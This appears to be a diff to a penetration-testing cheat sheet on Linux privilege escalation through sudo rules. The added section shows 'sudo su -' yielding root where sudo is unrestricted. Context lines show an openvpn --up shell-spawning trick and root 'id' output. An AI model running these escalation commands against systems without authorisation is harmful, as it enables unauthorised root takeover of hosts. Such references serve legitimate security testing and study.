@@ -1352,6 +1352,12 @@ sh-3.2# id
 uid=0(root) gid=0(root)
 ````
 ### sudo -l / SUID Binaries
+#### (ALL) NOPASSWD: ALL
+````
+sudo su -
+root@WEB01:~# whoami
+root
+````
 #### (ALL : ALL) /usr/sbin/openvpn
 ````
 sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
